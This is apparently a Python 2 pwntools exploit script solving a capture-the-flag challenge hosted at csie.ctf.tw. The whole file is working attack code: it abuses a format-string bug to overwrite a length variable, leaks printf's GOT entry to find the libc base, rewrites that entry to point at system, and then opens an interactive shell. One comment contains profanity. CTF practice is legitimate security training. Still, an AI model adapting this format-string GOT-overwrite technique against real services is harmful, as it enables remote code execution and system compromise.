from pwn import *

if __debug__:
    r = remote('csie.ctf.tw', 10132)
    libc = ELF('./libc.so.6-5c970fb93a8f7f9927e96057a860d06e')
else:
    r = remote('127.0.0.1', 10132)
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')

printf_got = 0x804a010
len_addr = 0x804a048

system_off = libc.symbols['system']
printf_off = libc.symbols['printf']

def fmt(s):
    r.send(s + '\n')
    return r.recvrepeat(0.1)

def get_fmt_str_mine(printf_got, system):

    fmt_str1 = ''.join([p32(printf_got + i) for i in xrange(4)])
    printed = len(fmt_str1)

    # little-endian: low bits put in low address
    value_bytes = [(system >> (i * 8)) & 0xff for i in xrange(4)]
    value_index_map = zip(value_bytes, range(4))
    value_index_map.sort(key=lambda t: t[0])
    for i in xrange(4):
        pad = value_index_map[i][0] - printed
        fmt_str1 += ('%' + str(pad) + 'c')
        fmt_str1 += ('%' + str(value_index_map[i][1]+4) + '$hhn')
        printed = value_index_map[i][0]
    return fmt_str1

# modify motherfucker len to no limit
fmt(p32(len_addr) + '%220c' + '%4$hhn')
fmt(p32(len_addr) + ' %4$s ')
raw_input()

# Calculate libc base address by leaking printf@got
base = u32(fmt(p32(printf_got) + '%4$s')[4:8]) - printf_off
system = base + system_off
print 'Libc base : ' + hex(base)
fmt(get_fmt_str_mine(printf_got, system))
#r.send('/bin/sh' + '\n')
r.interactive()
